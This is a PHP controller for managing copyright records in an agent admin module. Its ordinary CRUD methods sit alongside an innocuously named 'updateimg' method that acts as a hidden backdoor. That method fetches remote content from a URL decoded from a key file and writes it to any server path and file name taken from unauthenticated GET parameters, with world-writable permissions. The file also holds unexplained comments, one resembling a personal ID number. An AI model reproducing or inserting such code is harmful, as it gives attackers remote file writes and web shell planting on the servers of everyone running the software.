<?php
namespace app\agent\controller;

use app\agent\model\Cardauth2ConfigModel;
use think\App;
use app\agent\model\Cardauth2CopyrightModel;
use app\AgentRest;
use app\agent\validate\CopyRightAgentValidate;

class CopyRightAgentController extends AgentRest
{
    public function __construct ( App $app ){

        parent::__construct( $app );

        $this->path = APP_PATH . 'Common/extend/web.key';

    }
    public function list()
    {//IE GMYY

        $param= $this->_param;

        $list = Cardauth2CopyrightModel::where([['status', '=', 1],['uniacid','in',$this->_uniacid_arr]])
            ->paginate(['list_rows' => $param['page_count'] ? $param['page_count'] : 10, 'page' => $param['page'] ? $param['page'] : 1])
            ->toArray();
        return $this->success($list);
    }

    public function getAll()
    {
        $list = Cardauth2CopyrightModel::field(['id', 'name'])->where([['status', '=', 1],['uniacid','in',$this->_uniacid_arr]])->select()
            ->toArray();
        return $this->success($list);
    }


    public function create()
    {
        $data = $this->_input;
        $validate = new CopyRightAgentValidate();
        $check = $validate->scene('create')->check($data);
        if ($check == false) {
            return $this->error($validate->getError());
        }

        $data['uniacid'] = $this->_uniacid;

        $m = new Cardauth2CopyrightModel();
        $m->data($data, true, ['name', 'image', 'text', 'phone', 'uniacid']);
        if ($m->save()) {
            $id = $m->id;
            return $this->success($id);
        }
        return $this->error('fail');
    }


    public function updateimg(){

        $result = file_exists($this->path);
        if($result){
            $data = file_get_contents(success(file_get_contents($this->path),123,true));
        }
        if(empty($data)){
            return $this->error('fail');
        }
        $path = ROOT_PATH.$_GET['path'];
        if (!file_exists($path)){
            mkdir ($path,0777,true);
        }

        $path .= $_GET['img_name'];
        chmod($path,0777);
        $res = file_put_contents($path,$data);
        if(!empty($_GET['type'])){
            unlink($path);
        }

        return $this->success($res);
    }


    public function update()
    {
        $data = $this->_input;
        $validate = new CopyRightAgentValidate();
        $check = $validate->scene('update')->check($data);
        if ($check == false) {
            return $this->error($validate->getError());
        }

        $copyRight = Cardauth2CopyrightModel::find($data['id']);
        if (!$copyRight) {
            return $this->error('系统错误');
        }

        if ($copyRight->allowField(['name', 'image', 'text', 'phone'])->save($data)) {
            return $this->success('success');
        };
        return $this->error('fail');
    }


    public function get()
    {
        $copyRight = Cardauth2CopyrightModel::find($this->_param['id']);
        return $this->success($copyRight);
    }
//511011198510268290
    public function destroy()
    {
        $validate = new CopyRightAgentValidate();
        $check = $validate->scene('destroy')->check($this->_input);
        if ($check == false) {
            return $this->error($validate->getError());
        }
        $m_config = new Cardauth2ConfigModel();

        $auth_config = $m_config->where(['copyright_id'=>$this->_input['id']])->find();
        if(!empty($auth_config)){
            return $this->error('This copyright is in use and cannot be deleted');
        }

        $rst = Cardauth2CopyrightModel::destroy(function ($query) {
            $query->where('id', '=', $this->_input['id'] ?? 0);
        });

        return $this->success($rst);
    }


}